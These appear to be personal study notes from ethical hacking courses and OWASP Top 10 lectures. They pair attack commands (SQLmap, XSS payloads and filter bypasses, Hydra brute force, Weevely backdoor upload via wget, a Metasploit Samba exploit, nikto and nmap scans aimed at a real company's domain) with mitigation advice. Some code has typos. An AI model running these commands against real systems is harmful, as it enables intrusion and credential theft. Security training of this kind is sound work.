+http://10.0.2.4/mutillidae/index.php?page=user-info.php&usernameadmin&password=aaas&user-info-php-submit-button=View+Account+Details
+
+
+Video 55:
+------------
+using Tool:
+Exploitation - SQL injection
+SQLmap---
+>sqlmap --help
+>sqlmap -u[target-URL]
+
+http://10.0.2.4/mutillidae/index.php?page=user-info.php&usernameadmin&password=aaas&user-info-php-submit-button=View+Account+Details
+
+sql-shell>select table_name from information_schema.tables where table_schema = 'owasp10'
+Video 56:
+------------
+Preventing SQLi
+
+- filters can be bypassed
+- User black list of commands? still can be bypassed
+- Use whitelist? Same issue
+
+-> Use parameterized statements, separate data from sql code.
+
+Video 57:
+-------------
+Exploitation - XSS Vulns
+-------------------
+XSS - Cross Site Scripting Vulns
+- Allow an attacker to inject javascript code into the page
+- Code is executed when the page loads
+- Code is executed on the client machine not the server
+
+Three main types:
+1. Persistent/Stored XSS
+2. Reflected XSS
+3. DOM based XSS - results from JS code writen on the client - code will be interprited executed on client side without having any communication with WebServer
+this could be very dangerous as Webserver would apply some sort of security and filteration; but with DOM based the code would never sent to Webserver
+
+Video 58:
+-------------
+Discovering XSS
+- Try to inject javaScript code into the page
+- Test text boxes and url parameters on the form
+ http://target.com/page.php?something=something
+
+Reflected XSS
+- None persistent, not stored
+- Only work if the target visits a specially crafted URL
+-Ex:
+http://target.com/page.php?something=<script>alert("XSS")</script>
+
+Video 58:
+-------------
+<script>alert("XSS")</script>
+
+referece of XSS:
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+Video :60
+-------------
+";alert("XSS");//
+
+Video :61
+-------------
+Stored XSS
+- Persistent, stored on the page or DB
+- The Injected code is executed everytime the page is loaded
+
+<script>alert("XSS")</script>
+
+Video :62
+-------------
+-if there is a limit on name field; just inspect and edit it to requiered size
+-if code is checking for '/" - we can buypass as below
+<ScrIPT>alert(String.fromCharCode(108.97.108.97))</SCRipt>
+we can find a "charcode calculator" from google
+
+<sCripT>alert("xss")<SCRipt>
+
+Video:63
+------------
+Exploiting XSS - BEEF Framework
+-Run any javascript code
+-Target can be hooked to beef using JavaScript code
+-Browser Exploitation Framework allowing us to launch a number of attacks on a hooked target
+
+-> Inject Beef hook in vulnerable pages
+-> Execute commands from beef
+
+Video:66
+-------------
+Executing cmd on hooked target
+
+Video:67
+-------------
+explanation of supported commends
+
+Video 68:
+----------
+VEIL - Framework
+- A backdoor is a file that gives us full control 
+over the machine that it gets executed on
+- Backdoors can be caught by Anti-Virus programs
+- Veil is a framework for generating Undetectable backdoors
+
+Video 69:
+----------
+VEIL - Framework
+Available tools:
+
+Video 70: generating payload
+----------
+VEIL - Framework
+
+no distribute --- website to scan the back door payload
+
+Video 71: 
+----------
+
+Video 72: 
+----------
+
+Video 74: Fixing XSS vulns
+----------
+- Minimize the usage of user input on html
+- Escape any untrusted input before inserting it into the page.
+Char Result
+&  -- &amp;
+< -- &lt;
+> -- &gt;
+"  -- &quot;
+'  -- &#x27;
+/  -- &#x2F;
+
+https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+
+Video 75:  
+Logging In As Admin Without a
+Password By Manipulating Cookies
+----------
+
+Video 76:
+Discovering Cross Site Request
+Forgery Vulnerabilities (CSRF)
+-------------
+Cross Site Request Forgery
+- Requests are not validated at the server side
+- Server does not check if the user generated the request
+- Requests can be forged and sent to users to make them do things they don't intend to do 
+	such as changesing their password
+ 
+Video 77:
+Exploiting CSRF Vulnerabilities
+To Change Admin Password Usin…
+----------------------------------
+
+Video 78:
+Exploiting CSRF Vulnerabilities
+To Change Admin Password Usin…
+--------------------------------
+Cross Site Request Forgery
+- Requests are not validated at the server side
+- Server does not check if the user generated the request
+- Requests can be forged and sent to users to make them do things they don't intend to do 
+	such as changesing their password
+
+Video 79:
+[Security] The Right Way To
+Prevent CSRF Vulnerabilities
+---------------------------
+- CSRF Tokens
+
+Mitigation - CSRF Vulnerabilities
+
+- 1 best way to avoid CSRF - is to make sure user is submitting data via page which was served to him by web application
+   - this can be done using Syschronizing tokens
+Dynamic Syschronizing tokens
+----------------
+1. Generate on unpredictable token that can not be reused
+  - Token needs to be a large value
+  - It must be random
+  - It should be unique
+  - Other factors can be included in the token generation algorithm
+2. Embed the token in the HTML page in a hidden form
+3. Verify the token when the form is submitted
+
+
+Video 80:
+------------------
+BRUTE Force & Dictionary Attacks
+-----------------------
+1. Brute Force Attacks
+Cover all possible combinations
+2. Dictionary Attacks
+Use a wordlist, try every password in the list only
+
+Video 81:
+------------------
+Creating a Wordlist
+------------------
+Crunch can be used to create a wordlist
+
+Syntax:
+>crunch [min][max][characters]-t[pattern]-o[FileName]
+
+Ex:
+>crunch 6 8 123abc$ -o wordlist -t a@@@@b
+
+Generated passes:
+aaaaab
+aabbbb
+aan$$b
+....
+
+options:
+-p 
+
+Video 82:
+------------------
+HYDRA
+
+Hydra is a bruteforce tool that can be used to bruteforce almost any authenticaiton service
+
+Syntax:
+>hydra[IP]-L[usernames]-P[passwords][service]
+
+Example:
+>hydra 10.20.14.212 -l admin -P /root/wordlist.txt http-post-form "/mutillidae/?page=
+login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+
+Video 83:
+------------------
+ZED Attack Proxy ZAP
+- Automatically find vulnerabilities in web applications
+- Free and easy to use.
+- Can also be used for manual testing
+
+Video 84:
+------------------
+Analysing ZAP scan results:
+------------------------
+
+Video 85:
+------------------
+Post Exploitation Introduction
+-------------------------------
+
+Video 86:
+------------------
+Interacting with the Reverse Shell
+Access Obtioned in previous Lecture
+
+Video 87:
+------------------
+Escalating Reverse Shell Access To Weevely Shell
+
+Video 88:
+------------------
+POST Exploitation
+Basic Bash to WEEVELY
+1. Generate backdoor
+ > weevly generate[password][file name]
+2. Upload it to any server(make sure you have a direct URL)
+3. Download it from hacked machine
+> wget[url]
+4. Connect to it from Kali
+> weevely [url to file][password]
+
+Video 89:
+------------------
+Weevely basic- Accessing other Websites, Running Shell Commands ....
+
+Weevely cmd:
+help
+:help
+:system_info -info
+:audit_etcpassword -h
+
+Video 90:
+------------------
+Bypassing Limited Privileges & Executing Shell Commands
+
+Video 90:
+------------------
+Downloading File from target webserver
+
+Video 91:
+------------------
+Uploading File To Target Webserver
+- Upload files to web server
+- Find plugin help
+> file_upload -h
+- Useage
+> file_upload -vector [VERCTOR][location on local machine][location to store file]
+
+Video 92:
+------------------
+Getting a Reverse connection from Weevely
+
+Video 93:
+------------------
+Accessing the DB
+1. Find and read config file
+2. Use sql_console to drop to sql console or sql_dump the whole
+DB, ex:
+>sql_console -h
+>sql_dump -h
+
+Useage
+>sql_dump -vector [vector] -host[HOST] -lpath[location to store data][DBName][username][password]
+
+Video 94:
+------------------
+
+
+=======================================================
+https://www.youtube.com/watch?v=3Kq1MIfTWCE
+full ethical hacking course - network penetration testing for beginners (2019)
+==========================================================
+GREENSHOOT - to take screen shots
+
+etc/password -- users
+etc/shadow  -- Hash tags
+
+switch user:
+su bob
+su - ---to move back to root
+
+Network cmd
+- ifconfig -- ethernet
+-iwconfig -- wifi
+ping -c 1 10.10.100.1 -- to ping once
+
+arp -a  --- to get mac address 
+netstat -ano --- shows all the ports open -- and what is running on the perticular port
+route -- to get the rout table
+history -- cmd to get the command executed
+history | grep ping
+echo "hello again" > hello.txt
+echo "hello again" >> hello.txt
+touch hello2.txt
+nano hello3.txt
+gedit hello.txt
+apt-get install gedit
+apt install git -y
+apt install ftp
+clone -- https://github.com/SecureAuthCorp/impacket.git
+
+service apache2 start ---to start apache
+service ssh start
+service postgresql start
+service apache2 stop
+systemctl enable ssh
+systemctl enable postgresql
+
+Script:
+-----------
+cat ip.txt | grep "64 bytes" | cut -d " " - f 4 | tr -d ":"
+nana ipsweep.sh
+
+//scrpt to ping ip address in range 1 - 255
+#!/bin/bash
+if [ "$1" == "" ]
+then
+echo "You forgot an ip address"
+echo "Syntax: ./ipsweep.sh 192.168.1"
+else
+for ip in `seq 1 254` ; do
+ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
+done
+fi
+
+chmod +x ipsweep.sh
+./ipsweep.sh 192.168.1 > iplist.txt
+cat iplist.txt
+
+for ip in $(cat iplist.txt); do nmap -p 80 -T4 $ip & done
+
+Part2:
+Python 101
+1:43:46
+
+port scanning
+-------------------
+#!/bin/python3
+import sys
+import socket
+from datetime import datetime
+
+#define our target
+if len(sys.argv) == 2:
+	target = socket.gethostbyname(sys.argv[1])#translate a host name to IPv4
+else:
+	print("Invalid # of args")
+	print("Syntax: python3 scanner.py <ip>")
+	sys.exit()
+print("-"* 50)
+print("Scanning target"+target)
+print("Time started"+str(datetime.now()))
+print("-" * 50)
+
+try:
+	for port in range(50,85)
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		socket.setdefaulttimeout(1)#is a float
+		result = s.connect_ex((target,port))#returns error indicator
+		print("Ckecking port{}".format(port))
+		if result == 0:
+			print("port {} is open".format(port))
+		s.close()
+except KeybortInterrupt:
+	print("Exiting program")
+	sys.exit()
+
+except socket.gaierror:
+	print("Hostname could not be resolved")
+	sys.exit()
+except socket.error:
+	print("couldn't connect to server")
+	sys.exit()
+
+4:24:05
+THE FIVE STAGES OF HACING
+1. Reconnaisance - information gethoring
+  - passive vs active
+2. Scanning and Enumeration
+  - Nmap, Nessus, Nikto etc
+3. Gaining Access
+4. Maintaing Access
+5. Covering Tracks
+
+PASSIVE RECON - PHYSICAL / SOCIAL
+
+Location Information - 
+ - Satellite images
+ - Drone recon
+ - Building layout(badge readers, break areas, security, fencing)
+Job Information
+ - Employees(name, job title, phone number, manager, etc)
+ - Pictures(badge photos, desk photos, computer photos, etc)
+
+
+PASSIVE RECON - WEB / HOST
+Target Validation - WHOIS, nslookup, dnsrecon
+Finding Subdomains - Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc
+Fingerprinting - Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat
+Data Breaches - HavelBeenPwned and similar lists
+
+LASTLY: THERE ARE A LOT OF OSINT TOOLS.
+
+bugcrowd.com --- to get test work
+4:41:53
+hunter.io -- to get any company email address pattern
+ex: tesla.com
+
+4.46
+1.4 billion cleartext password
+
+on google
+--
+site:tesla.com -www
+site:tesla.com filetype:pdf
+
+5:10
+
+>theharvester-d tesla.com -l 500 -b google
+--- -l 500 --- length of google search of 500 searches
+
+haveIbeenPwned -- to see if the user is pwneed
+todd@tesla.com
+
+#pip install bluto -- to reconniesence
+gedit /user/local/bib/python2.7/dist-packages/Bluto/modules/data_mine.py
+5:19.21
+bluto github ---google -- recon tool it help to get below info
+DNS Recon | Brute Forcer | DNS Zone Transfer | DNS Wild Card Checks | 
+DNS Wild Card Brute Forcer | Email Enumeration | 
+Staff Enumeration | Compromised Account Enumeration | 
+MetaData Harvesting
+--it gets DSN name -- DNS recons
+--gets name servers
+--Mail servers
+-- NetCraft - to get sub domains
+-- Zone transfers -- not that important
+-- Gathering data from GOOGLE, Bing and LinkedIn
+
+bluto
+tesla.com
+yes
+
+
+https://crt.sh
+to find subdomains
+input
+'%tesla.com'
+
+Finger printing tools
+---------------------
+Wappalyzer -- add on tool to browser - to know what technology the wesite is running on
+whatweb -v https://tesla.com  -- on kali
+builtwith.com -- website -- info on what all the tech website is using
+
+5.41.42
+Scanning Tools & Tactics
+============================
+Protocols
+TCP and UDP
+3 way handshake
+
+TCP vs UDP
+------------
+TCP 
+- Connection oriented
+- Has a handshake
+- Used on applications requiring high reliability
+-Example: HTTP, FTP, Telnet
+
+UDP
+- Connectionless
+- No handshake
+- Used on application requiring a fast connection
+- Examples: DNS, DHCP, SNMP
+
+SYN
+SYN ACk
+Ack
+Client hello
+
+NMAP - 5.48.40
+nmap - by default it uses 
+sequence of connection flow of nmap
+1. SYN
+2. SYN ACK
+3. RST
+
+>nmap --help
+>nmap -sn 192.168.1.0/24
+>nmap -T4 192.168.1.254  --- T4 speed of scan T1 slow - ports- 65535
+>nmap -T4 -A -p- 192.168.1.254 
+  --- -A for all detection - os detection;version detection
+  -p- all port to scan
+>nmap -T4 -p- 192.168.1.254
+
+>nmap -T4 -A -p53,80,111,443,514 192.168.1.254 
+
+>nmap -T4 -p- 192.168.1.254 -oA
+
+Scanning with UPD:
+---------------------
+nmap -sU -T4 192.168.1.254
+
+ls /usr/share/nmap/scripts  -- script to scan for vlun
+
+ls /usr/share/nmap/scripts/
+
+***
+web assisment - to check for the ciphers vlun
+nmap -p 443 --script=ssl-enum-ciphers tesla.com
+--gives rating for the ciphers used
+-- A good
+-- if you get 'c' / 'd'
+****
+6.16.30
+install "nessus"
+nessus home and download -- 64 bit debian kali
+cd Downloads
+>dpkg -i <file-name>
+>/etc/init.d/nessusd
+https://kali:8834/#/
+
+webscanner:
+----------------
+>nikto
+>nikto --help
+>nikto -H
+>nikto -h https://tesla.com  -- scanning against host "tesla.com"
+
+metaspolit:
+----------------
+>msfconsole
+>search portscan
+>use auxiliary/scanner/portscan/syn
+
+6.43.30
+Burbsuit:
+-----------
+Burbsuit: and nessus 2 tools to start a pen testing company
+
+6.56.50
+Enumaration:
+-----------------
+Kioptrix - hack the box -- to make not of findings (7.17.30)
+
+>netdiscover -r 192.168.1.245/24
+
+7.04 -- Nesses - 
+
+nmap - 7.06.
+80,443,139
+
+>nikto -h 192.168.202.130  ----enumaration tool to exploit a host
+>dirbuster  -- web Application brute forcing (7.25.30)
+>curl --head 192.168.202.130 -- to get header info
+>nmap --script=ssl-enum-ciphers -p 443 192.168.202.130
+>searchsploit apache 1.3.20
+>smbclient -L \\\\192.168.202.130
+>smbclient -L \\\\192.168.202.130\\IPC$
+>
+ ---TCP scan
+nmap -T4 -p- 10.10.10.133  ---T4 top 4 port scan
+after getting top 4 ports we will scan only that ports
+nmap -A -T4 -p22,80,60080 10.10.10.133
+UDP scan:
+nmap -sU -T4 10.10.10.13
+
+8.24
+nikto -h onetwoseven.htb -- <onetwoseven.htb>- host name
+---nikto tool helps to find server info and missing header tags
+- like 
+ - x-xss-protection header is not set
+ - x-xontent-Type-options header is not set
+
+8.35
+
+8.37
+REVERSE SHEEL
+Netcat Reverse shell
+BIND SHELL
+STAGED VS NON-STAGED PAYLOADS
+
+8.41 -- Exploiting victeam using Bind Shell
+to listen on the port
+>nc -lvp 4445
+
+>nmap -T4 -p- -A 10.10.10.3
+
+use metasploit to exploit the vul
+
+>msfconsole  ----to open metasploit
+msf5> serach usermap
+msf5>use exploit/multi/samba/username_script
+>options
+>set rhosts 10.10.10.3
+>run
+
+CREDENTIAL STUFFING
+- Injecting breached account credentials in hopes of account takeover
+
+9.33 --
+breach-parse -- username and Pw -- contents- getting UN and PW
+https://github.com/hmaverickadams/breach-parse
+
+AD exploit:
+===============
+9.57 -- windows Server setup
+LLMNR/NBT-NS poisoning
+
+11.20
+******
+Doc to read Penetration testing:
+AD - Active Directorys
+AD Beginner/Common Tactics:
+https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
+
+Advanced AD
+https://adsecurity.org/
+https://blog.harmjOy.net/
+
+linux Privilege Escalations
+https://blog.gOtmilk.com/2011/08/basic-linux-privilege-escalation/
+
+Windows Non-AD privilege Escalations
+https://www.fuzzysecurity.com/tutorials/16.html
+
+Common AD attack strategies
+-----
+LLMNR/NBT-NS Poisoning
+-Crack hashes offline
+  - Test credentials agaist logins, PSExec, CrackMapExec
+- Relay hashes (SMB signing must be disabled)
+
+Other Common Attacks
+- Kerberoasting, GPP/C-passwords, MS17-010(next week?)
+
+Low-hanging Fruit
+- Example: default credentials
+
+Certiication/courses/Training
+--------
+-eLearnSecurity PTX
+ - https://www.elearsecurity.com/course/penetration_testing_extreme/
+-PentesterAcademy Attacking and Defending Active Directory
+ - https://www.pentesteracademy.com/course?id=47
+-PentesterAcademy Red Team Labs
+ - https://www.pentesteracademy.com/course?id=44
+-Hack The Box Rasta Labs & Offshore ----11.32.40
+ - https://www.hackthebox.eu
+
+https://www.hackthebox.eu/home/machines/retired
+
+https://www.youtube.com/watch?v=3Kq1MIfTWCE
+
+Video on Webservicetesting
+------------------------------
+https://www.youtube.com/watch?v=e6HAQnvuaic
+
+Link to enhance the image
+=================================
+https://www.tutorialspoint.com/sharpen_photo_online.htm
+
+OWASP Top 10
+---------------
+Video 1:
+https://www.youtube.com/watch?v=m66tycGq6Gg&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl
+
+Removed entries:
+- Cross-site request forgery(CSRF)
+- Unvalidated redirects and forwards
+- Insecure direct references and Missing function-level access control have been merged into a single A5 - Broken access control
+
+ASVS level 3 application -- (OWASP ASVS - Application Security Verification Standard Levels)
+
+Video 2:
+https://www.youtube.com/watch?v=3ZjkIA1k8Ac&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=2
+A1 - Injection
+
+What is it?
+- when untrusted data is taken from user input and applied to some kind of query or interpreter in a way that assumes what the data will look like
+- An attacker enters data that does not fit hte expected input but malforms it in some way to have unintended consequences, such as error leakage, damage to data or exposure of data
+- An attacker can bypass any client-side controls that might be intended to stop this
+- Usually related to SQL but can also apply to LDAP or OS calls - anything that builds a query from user input.
+
+How common is it?
+- It is not the most common but it is the most serious vulnerability found in web applications
+- If the site is vulnerable, it is usually quite easy to take advantage of
+- It is usually easy to find out if a site is vulnerable
+- Many frameworks are vulnerable by default of easily allow the vulnerability to be used
+- Many examples in text books and online use code that is vulnerable, usually because that is not what the author is trying to teach
+
+Example:
+Bank Account Name: --- Text field
+I/p: 
+ram jaya -- valid
+ram jaya'); dkjdkjdkj --' ---- invalid
+ram jaya'); select * from [users] -- to check for the existance of table
+ram jaya'); delete from bankaccount --
+
+insert into backaccounttable(name) values('ram jaya')
+insert into backaccounttable(name) values('ram jaya'); dkjdkjdkj --'
+
+How to Fix it
+- Very easy to fix when building a new site - just do it properly
+- Fixing an existing site might be hard
+- Parameterised queries allow the framwork to escape user input
+- Stored procedures allow you to restrict what the application can do on the DB e.g. not allowed to "select * from users"
+- Input validation should be applied,  server-side to all user input
+- Do not rely on input validation alone
+
+1. Have parameterized query - instead of using user input directly in query
+2. Prefered way - to have stored procedure - as we can have defiend operations to perform on DB
+3. Input validation - using regx - expression
+4. Have try/catch block - to not expose error messages
+5. Separating code and data - having safe API
+
+Video 3:
+--------------
+A2 - Broken Authentication:
+https://www.youtube.com/watch?v=O3YktuvsYDk&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=3
+
+What is it?
+- Authentication is a user proving who they are
+- If an authentication system is not correctly inplemented, an attacker can impersonate
+someone else and gain access to data or functionality that they shouldn't
+- Authentication and session involve cookies which provide an easy way for an attacker to try
+and impersonate someone else
+- The authentication system itself might be bypassed or permissions elevated if it is not coded correctly
+- Brute-force or credential - stuffing can be used
+
+How common is it?
+- This is very common on older applications and reasonably common on those written from scratch
+- Modern featured frameworks are usually secure by design but
+- Where the functionality has been extended or replaced, it might get broken
+- If you think you understand but don't, you might break something
+- Some things are not 'Broken' but are still vulnerable to DDoS
+
+How to fix it
+- Use a modern framework which has been heavily used and tested
+- If you cannot rewrite your application, can you copy in code from newer framework?
+- Be mindful of your password hashing algorithm, use one and make it updatable
+- Ensure httponly and secure flags on cookies
+- Use a combination of independent pen-testing and code review if you are not sure
+- Use rate-limiting(might be built into web server)
+- Consider blacklisting weak password
+- Consider strengthening password reset processes
+- Consider multi-factor authentication, generally or in specific cases
+- Check that session ids are regenerated after login
+- Check that auth tokens are correctly invalidated server-side(SSO)
+- Userids can be secure but might be hared to remember
+
+Broken Authentication: **************
+- where credentials are compromised
+- here attacher has may way to exploit application for Broken Authentication
+ - where he has access to hundred of valid UserName and password combinations for credential stuffing
+ - default admin account lists, 
+ - he can go with automated brute force and dictionary attack tools.
+ - Session management attacks - particularly in relation to unexpired session tokens
+
+Prevalence - 
+ - BA is widespread as most applications use identity and access controls.
+
+Example Attack Scenarios
+Scenario 1: Credential Stuffing - the use of lists of known passwords
+ - is a common attack
+ - IF an application does not implement automated threat or credential stuffing protenctions
+   - atacker can use application to determine if the credentials are valid
+Scenario 2: 
+
+Scenario 3:
+Application session timeouts aren’t set properly. A user uses a public computer to 
+access an application. Instead of selecting “logout” the user simply closes the browser 
+tab and walks away. An attacker uses the same browser an hour later, and the user is 
+still authenticated.
+
+How to Prevent
+1. implement multi-factor authentication
+ - to prevent automated, credential stuffing, brute force, and stolen credential re-use attacks.
+2. * Do not ship or deploy with any default credentials, particularly for admin users.
+3. Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.
+4. Align password length, complexity and password rotation policies
+5. Limit failed login attempts
+  - Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.
+6. Use a server-side, secure, built-in session manager that generates a new random session ID after login
+  - Session IDs should not be in the URL, be securely stored and invalidated after logout, idle, and absolute timeouts.
+
+Video 4:
+--------------
+https://www.youtube.com/watch?v=2ItoKCuq2kk&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=4&pbjreload=101
+A3 - Sensitive Data Exposure
+ - data seen in plane text that normaly should be hidden/encrypted
+ -* the most common flaw is simply not encrypting sensitive data
+  - application is using weak key generation and management
+  - and weak algorithm, protocal and cipher usage is common,
+  - particularly for weak password hashing storage techniques( ex hasing alg - MD5, SHA(Secure Hash Algorithms), such as SHA-1,SHA-2 family that includes the widely used SHA-256 algorithm)
+
+*cipher* is an algorithm for encrypting and decrypting data
+
+Is the Application Vulnerable?
+- The first thing is to determine the protection needs of data in transit and at rest.
+ - for ex: PW, credit card number, health records, personal info and business secrets require extra protection
+    - particularly if that data falls under privacy laws, 
+	- EU's General Data Protection Regulation(GDPR)
+ 	- finacilal data protection such as PCI data Security standard (PCI DSS)
+      - For all such data:
+         -1 is any data transmitted in clar text?
+	  - this concerns protocals such as HTTP, SMTP and FTP.
+         -2 Verify all internal traffic
+	  - Ex: b/w load balancers, web servers, or back-end systems.
+	-3 Are any old or weak cryptographic algorithms used either by default or in older code?
+	-4 Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing?
+	-5 Is encryption not enforced, e.g. are any user agent (browser) security directives or headers missing?
+	-6 Does the user agent (e.g. app, mail client) not verify if the received server certificate is valid?
+
+How to fix it:
+- Take a considered view to data value
+- Remove data you don't need
+- Learn about encryption (Have a better encryption mechanisum - AES (Advanced Encryption Standard))
+- Enscription is generally lightweight so use it by default
+- Consider multiple levels of encryption
+- Do not store encrytion keys with data
+- Use hardware protection of keys where possible
+- Be careful where you get your advice from!
+
+Layers of Cryptography:
+- Full Disk Encryption
+- Data-at-rest(hashing, Symmetrical)
+- TLS formeraly known as SSL
+- PKE (https, PGP email)
+- Inter-app communications (RMI, DCOM, SOAP, RPC etc)
+- DB connections
+- Encryption of Configuration (eg. PKCS12 - SSL certificate usage)
+- Cloud mechanisms
+- STRIDE - Spoof, Tamper, Repudiation, Disclosure, DoS, Elevation
+
+Conclusion:
+- Consider data value
+- Learn about encryption
+- Do encryption correctly
+- Have a process that can be improved for consistency
+
+To Test Server Configuration:
+Online Tools:
+1.SSL Labs server test
+2.CryptCheck
+3.CypherCraft
+
+Offline tools:
+1.O-Saft - OWASP SSL advanced forensic tool
+2.CipherScan
+3.SSLScan
+
+A5- Broken Access Control:
+------------------------------
+good site to understand CORS---
+https://www.packetlabs.net/cross-origin-resource-sharing-cors/
+
+https://www.youtube.com/watch?v=ZG7gUwyxZBY&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=6
+What is it?
+- Missing or incorrect protection of data or functionality from unauthorised access
+- Assuming that permission is implied with visibility
+- Having a single point-of-Proction where multiple checks are needed
+- Not Using CORS protection for APIs/CDNs
+
+How common is it?
+- The lack of automatable testing can make this hard to detect=quite common
+- Many development team do not include functional testing of security controls
+- Many teams lack a consistent approach to access control
+
+Example: 
+- Insecure direct Object reference (IDOR) --- ?acct=notmyacct
+http://example.com/app/accountInfo?acct=notmyacct
+- Authenticated Users only - Atacker can access pages of Admin without proper access associated
+- Verb checking
+
+How to fix it
+- Ensure you have a set of standard controls available
+- Use checklists and code-review to ensure they are used everywhere
+- Include "public" markers to clearly indicate intention
+- Deny access by default applications-wide if possible
+- Use rbac system  where necessary
+  --*** We can restict user at different levels:
+	- Application level
+ 	- Controler level
+	- action levels
+- Use logging to detect attack attempts - learn from them
+- Use rate-limiting on websites 
+- Invalid access tokens after logout
+	
+CORS - Cross-origin resource sharing
+- Slightly complex and very misunderstood
+- Marks a resource as permitted from other specificed origins
+- Allows browser to break Same origin policy (SOP)
+- Only applies to certain requests
+- Only enforced in browsers - does not prevent direct attack
+
+Minimizing CORS
+- CORS is thought of as a security control
+- But it is actually a security bypass for Same Origin Policy
+- It only allows certain functionality and does not completely protect anything
+- A5 is suggesting that using CORS presents a weakness that could be overcome better using 
+  authorization controls
+
+A6- Security Misconfiguration
+==================================
+
+What is it?
+- Missing security hardening or incorrect permission on app/server
+- Unnecessary features/ports are available
+- Default accounts enabled
+- Error leakage
+- Updated security features are left disabled or misconfigured
+- Insecure configuration in web app or server frameworks
+- Lack of security headers
+- Vulnerable components used
+
+How common is it?
+- Quite common becuase it covers so many areas of a system
+- Common due to lack of automated deployment tooling
+- Some can be found by automated test tools
+- Exists across many systems and in many different forms
+- Not all vulnerabilities are as serious as others
+
+Ex: Area in which configurations are importent:
+Directory listing enabled
+SSL Labs checking (used Qualys SSL Labs - to check SSL configuration)
+Security Headers (Securityheaders.com)
+
+How to fix it:
+-Consistent process for server and app hardening
+-Consider minimal server as starting point
+-Regular consideration of new vulnerabilities
+-Segmentation of systems to reduced risk
+-Automated and online server checks
+
+A7: XSS (Cross site scripting) - 
+=================================
+1. go through Udemy - and below points
+https://www.youtube.com/watch?v=nRWn-eu6KTI&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=8
+3 Type of CSS
+1. Reflected
+2. Stored
+3. Dom Based XSS
+
+Primary difference b/w 3 XSS is where the attack is injected into the application
+- Reflected and Stored XSS are server side injection issues
+  - while DOM based XSS is a client(Browser) side injection issue
+- Reflected/Stored the attack is injected into the application during server-side processing of requests where untrusted input is dynamically added to HTML.
+  - For DOM XSS, the attack is injected  into the application during runtime in the client directly
+
+What is it?
+- Including attacker provided script into a pages output
+- Usually by assuming it is just text, it is simply echoed out
+- The Browser sees it as a script and runs it accordingly
+- Reflected XSS - takes data that is submitted to URL and inserts that in page o/p directly
+- Stored XSS - stored in DB - ex: foram post - if any users visits that page - he may be attacked
+- DOM XSS (video - https://www.youtube.com/watch?v=u-MYZpRFq-k)
+	- Type-0 XSS - payload is executed as a result of modifying the DOM
+	- No change in HTTP response
+	- No Proxy required to exploit
+ - To make Dynamic updates to HTML in the DOM Safe, we recommend
+	- 1. HTML encoding, and then
+	- 2. Javascript encoding all untrusted input, as shown in these examples
+
+How Common is it?
+- Affects > 2/3(60%) of the tested application
+- It generally exists by default, so no controls = vulnerable
+- Many frameworks do not enforce validation or encoding by default
+- Code examples do not necessarily include relevant controls
+
+Example - Reflected attack
+- 
+
+How to fix it:
+- *Have consistently applied development/review process to check
+- *Always validate user input including on the server
+- *You should generally always encode non-static output
+- Use the OWASP XSS cheat sheets
+- *Use a content-security-policy header to restrict inline scripts if possible
+- use the CSP to restrict scripts from other domains
+- *X-XSS-Protection header (this won't protect us from all browsers - may work on IE, but not on other browser)
+
+generaly XSS - relates to stealling Cookies which can be avoided using below steps
+How to mitigate it:
+- Set cookies to httponly - (so cookies cann't be accessed from script)
+- Set cookies to SameSite=Strict (this stops browser sending cookie to different domain)
+- Lock session to IP address (not 100% effective - if ip is coming from university)
+- Avoid using session cookie to protect secure data
+
+CSRF --- from udemy Video 75 - 79
+
+A8 - Insecure Deserialization
+=============================
+https://www.youtube.com/watch?v=62zA3qJyaIg&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=9
+
+Not easy to exploit
+Impact is sevier - which may result in code execution on target server or raise privialige to some users for appliction
+What is it?
+- A blanket term for any attack on a serialized object
+- Since objects can be used for anythings, it covers all parts of an app
+- Any time that an object can be changed without being detected, there is a risk
+
+we may have a scenario where we need to set RBAC for a user - we do it using Object may be JSON object
+ - with user name and role set
+ - this can be captured and data can be manupulated - instead of user A, changes can be appliced to User B
+ - and this goes unnoticed
+
+How common is it?
+- Exists in many places:
+- Remote procedure calls/IPC
+- Web services/APIs
+- Caching/Object storage
+- Databases/file system
+- Cookies, forms, tokens
+
+we have to make sure where the application is getting objects from and it has to be Deserialized safely
+- for example we have an application which set the user credentials on cookies - which will be serialized securly
+  - if not it will be exposed to attacker
+
+* Concept is - an attacker has got an object with is serialized with data/command and they are trying to get some kind of advantage
+
+How to fix it:
+- *Avoid serialization where it is unnecessary
+- Reserch and use best-practices - do not invent your own
+- *Avoid allowing objects from untrusted sources
+- *Use signatures to avoid tampering
+- *Use encryption in-transit to protect objects
+- *Use whitelisting of expected types/data
+- Sandboxing deserialization
+- *Logging for unexpected behaviour
+- *Put a question on the code review checklist - whethere you have used serilization/Deserialization how have you protected it
+
+A9 - Using components with known vulnerabilities:
+===================================================
+https://www.youtube.com/watch?v=bQWF29ujBpk&list=PLpNYlUeSK_rnsMu5S4UGtGy2HSmZdTUNl&index=10
+What is it?
+- We use a library and we don't keep up-to-date with vulnerabilities or even consider them at the beginning
+- We use libraries from untrusted sources becuase its all we can find
+- **We use server software or components that have know vulnerabilities and often leave unneeded functionality enabled
+- DB, OS and all other components are all protential risks
+- *when we have no process for monitoring and updating, we are vulnerable
+
+How common is it?
+- Exists in many places
+- Almost all applications will contain vulnerable components but..
+- ..these won't all be exploitable
+
+Ex - Shodan -- paid
